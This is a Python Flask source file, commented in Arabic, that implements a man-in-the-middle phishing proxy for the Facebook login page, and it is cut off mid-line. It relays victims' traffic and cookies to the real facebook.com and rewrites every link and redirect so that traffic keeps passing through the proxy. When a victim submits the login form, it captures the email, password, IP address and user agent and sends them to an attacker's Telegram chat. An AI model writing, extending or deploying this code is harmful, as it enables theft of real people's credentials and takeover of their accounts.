import os
import json
import requests
import re
from urllib.parse import urljoin, urlparse, quote, unquote
from flask import Blueprint, redirect, request, Response
import redis # سيتم افتراض أن redis_client متاح عالميًا أو يتم تمريره إذا لزم الأمر

secure_fb_bp = Blueprint('facebook', __name__)

# --- دالة مساعدة لإعادة كتابة جميع الروابط داخل محتوى HTML ---
def rewrite_urls(html_content, base_url, proxy_base_path):
    # نمط للبحث عن سمات href, src, action في علامات HTML
    # يهدف إلى التقاط: (<tag_name), (attr="), (value), (")
    html_pattern = re.compile(
        r'(<[a-zA-Z0-9_-]+)\s+([^>]*?\b(?:href|src|action|data-uri|data-jsid))\s*=\s*(["\'])(.*?)\3',
        re.IGNORECASE | re.DOTALL
    )

    # نمط إضافي لروابط CSS (url()) داخل سمات style أو كتل <style>
    css_url_pattern = re.compile(
        r'(url\s*\()(["\']?)(.*?)\2(\))',
        re.IGNORECASE | re.DOTALL
    )

    # دالة الاستبدال لروابط HTML
    def replace_html_url(match):
        tag, attr, quote_char, original_url = match.groups()
        # تجاهل الروابط الفارغة أو التي تبدأ ببروتوكولات غير HTTP/HTTPS
        if not original_url or original_url.startswith(('data:', 'javascript:', '#', 'mailto:')):
            return match.group(0)
        
        # تجنب إضافة الـ chat_id مرة أخرى إذا كان موجوداً
        temp_proxy_base_path = proxy_base_path.split('?id=')[0] if '?id=' in proxy_base_path else proxy_base_path

        # إذا كان الرابط هو لرابط البروكسي نفسه، فلا تعد كتابته لمنع الحلقات
        if temp_proxy_base_path in original_url:
            return match.group(0)

        # تحويل الرابط إلى مطلق باستخدام base_url (الرابط الأصلي لفيسبوك)
        absolute_url = urljoin(base_url, original_url)
        
        # التأكد من أن الـ chat_id مضاف بشكل صحيح لكل رابط بروكسي
        # يجب أن يكون proxy_base_path يحتوي على الـ chat_id مسبقًا
        proxied_url = f"{proxy_base_path}&url={quote(absolute_url)}" if "?" in proxy_base_path else f"{proxy_base_path}?url={quote(absolute_url)}"
        
        return f'{tag} {attr}={quote_char}{proxied_url}{quote_char}'

    # دالة الاستبدال لروابط CSS (url())
    def replace_css_url(match):
        full_match, open_paren, quote_char, original_url, close_paren = match.groups()
        if not original_url or original_url.startswith(('data:', '#')):
            return full_match
        
        temp_proxy_base_path = proxy_base_path.split('?id=')[0] if '?id=' in proxy_base_path else proxy_base_path

        if temp_proxy_base_path in original_url:
            return full_match

        absolute_url = urljoin(base_url, original_url)
        proxied_url = f"{proxy_base_path}&url={quote(absolute_url)}" if "?" in proxy_base_path else f"{proxy_base_path}?url={quote(absolute_url)}"

        return f"{open_paren}{quote_char}{proxied_url}{quote_char}{close_paren}"

    # إعادة كتابة روابط HTML
    rewritten_html = html_pattern.sub(replace_html_url, html_content)

    # إعادة كتابة روابط CSS (بما في ذلك تلك الموجودة في <style> أو سمات style)
    rewritten_html = css_url_pattern.sub(replace_css_url, rewritten_html)

    return rewritten_html

# --- دالة مساعدة لتحديد الـ URL الحقيقي لفيسبوك بناءً على طلب البروكسي ---
def get_real_facebook_url(request_path, query_string):
    # إذا كان هناك 'url' في الـ query string، فهذا يعني أننا نعالج رابطًا داخليًا لفيسبوك
    if 'url' in query_string:
        original_target_url = query_string.get('url')
        # فك تشفير الرابط الذي تم تشفيره بواسطة quote()
        return unquote(original_target_url)
    
    # خلاف ذلك، نعتبر أننا نستهدف صفحة تسجيل الدخول الرئيسية لفيسبوك
    return "https://www.facebook.com/login.php"


# --- دالة مساعدة لحفظ بيانات الاعتماد (سيتم ربطها بقاعدة البيانات لاحقًا) ---
def save_credentials_to_db(platform, username, password, ip_address, user_agent, target_chat_id, bot):
    # Placeholder: في المستقبل، سيتم حفظ هذه البيانات في جدول `collected_credentials`
    # مع ربطها بـ `user_id` الخاص بمالك البوت و `target_id` للضحية.
    
    # حاليًا، سنرسلها مباشرة إلى بوت التيليجرام
    alert_msg = (
        f"🚨 **تم التقاط صيد {platform} بنجاح عبر نظام الـ MITM!**\n"
        "----------------------------------\n"
        f"📌 **البريد/الهاتف:** `{username}`\n"
        f"🔑 **كلمة المرور:** `{password}`\n"
        f"🌐 **عنوان الـ IP:** `{ip_address}`\n"
        f"🌍 **المتصفح/الجهاز:** `{user_agent}`\n"
        "----------------------------------"
    )
    try:
        bot.send_message(target_chat_id, alert_msg, parse_mode="Markdown")
    except Exception as e:
        print(f"[-] Telegram Dispatch Error for {platform}: {e}")

# --- تهيئة مسارات Flask للفيسبوك ---
def init_facebook_routes(app, bot):
    # استخدام مسار ديناميكي للتعامل مع أي مسار فرعي يأتي من فيسبوك
    @app.route('/login.php', methods=['GET', 'POST'])
    @app.route('/login.php/', methods=['GET', 'POST']) # للتعامل مع /login.php/ بشكل صريح
    @app.route('/login.php/<path:subpath>', methods=['GET', 'POST'])
    def fb_trap(subpath=''):
        target_chat_id = request.args.get('id', None)
        
        # تحديد الـ URL الأصلي لفيسبوك الذي يجب استهدافه بناءً على الـ query string
        real_fb_url = get_real_facebook_url(request.path, request.args)
        
        # بناء الـ base URL الخاص بالبروكسي (مثل https://yourdomain.com/login.php?id=CHAT_ID)
        # نستخدم request.base_url لتضمين الـ query string الأصلي مثل ?id=CHAT_ID
        proxy_base_path = f"{request.url_root.rstrip('/')}/login.php"
        if target_chat_id:
             proxy_base_path += f"?id={target_chat_id}"

        # لضمان أن جميع الطلبات (GET و POST) تمر عبر البروكسي
        try:
            # تجميع الـ headers من الضحية لإرسالها لفيسبوك الحقيقي
            # استبعاد headers معينة قد تسبب مشاكل أو تعارضات
            headers_to_forward = {
                k: v for k, v in request.headers if k.lower() not in [
                    'host', 'content-length', 'cookie', 'x-forwarded-for', 
                    'x-real-ip', 'cf-connecting-ip', 'connection', 'proxy-connection'
                ]
            }
            # يجب تعيين الـ Host header ليتوافق مع النطاق الحقيقي لفيسبوك
            headers_to_forward['Host'] = urlparse(real_fb_url).netloc
            # يمكن إضافة User-Agent افتراضي في حالة عدم وجوده أو لضمان التوافق
            headers_to_forward['User-Agent'] = request.headers.get("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
            
            # تمرير جميع ملفات تعريف الارتباط (cookies) من الضحية إلى فيسبوك الحقيقي
            cookies_to_forward = request.cookies

            # --- معالجة طلبات POST (لحظة إدخال بيانات الاعتماد) ---
            if request.method == 'POST':
                # التقاط بيانات الاعتماد قبل إرسالها لفيسبوك الحقيقي
                username = request.form.get('email')
                password = request.form.get('pass')
                
                # استخراج الـ IP الحقيقي
                source_ip = request.headers.get('CF-Connecting-IP') or \
                            request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or \
                            request.remote_addr
                
                # استخراج الـ User-Agent
                user_agent = request.headers.get('User-Agent', 'Unknown')

                if username and password and target_chat_id:
                    # حفظ وإرسال بيانات الاعتماد عبر التيليجرام
                    save_credentials_to_db("Facebook", username, password, source_ip, user_agent, target_chat_id, bot)
                
                # إعادة توجيه طلب POST الأصلي بالكامل إلى فيسبوك الحقيقي
                proxied_response = requests.post(
                    url=real_fb_url,
                    headers=headers_to_forward,
                    data=request.get_data(), # تمرير البيانات الخام للـ POST request
                    cookies=cookies_to_forward,
                    allow_redirects=False, # سنتعامل مع الـ redirects يدوياً
                    timeout=15,
                    stream=True # لقراءة المحتوى على دفعات
                )

            # --- معالجة طلبات GET (جلب الصفحات) ---
            else:
                proxied_response = requests.get(
                    url=real_fb_url,
                    headers=headers_to_forward,
                    cookies=cookies_to_forward,
                    allow_redirects=False,
                    timeout=15,
                    stream=True
                )
            
            # إنشاء استجابة للضحية
            response = Response(
                proxied_response.iter_content(chunk_size=1024), # قراءة المحتوى على دفعات
                status=proxied_response.status_code
            )
            
            # تمرير جميع الـ headers من فيسبوك الحقيقي إلى الضحية
            for key, value in proxied_response.headers.items():
                if key.lower() not in ['content-encoding', 'content-length', 'transfer-encoding', 'location', 'host']:
                    response.headers[key] = value

            # معالجة الـ redirects يدوياً
            if proxied_response.status_code in (301, 302, 307, 308) and 'Location' in proxied_response.headers:
                original_location = proxied_response.headers['Location']
                # إعادة كتابة رابط الـ Location ليمر عبر البروكسي الخاص بنا
                absolute_redirect_url = urljoin(real_fb_url, original_location)
                proxied_redirect_url = f"{proxy_base_path}&url={quote(absolute_redirect_url)}" if "?" in proxy_base_path else f"{proxy_base_path}?url={quote(absolute_redirect_url)}"
                response.headers['Location'] = proxied_redirect_url
            
            # إذا كان المحتوى HTML، فقم بإعادة كتابة الروابط فيه
            content_type = proxied_response.headers.get("Content-Type", "").lower()
            if "text/html" in content_type:
                # يجب قراءة المحتوى بالكامل قبل إعادة كتابة الروابط
                html_content = proxied_response.text 
                modified_html = rewrite_urls(html
 
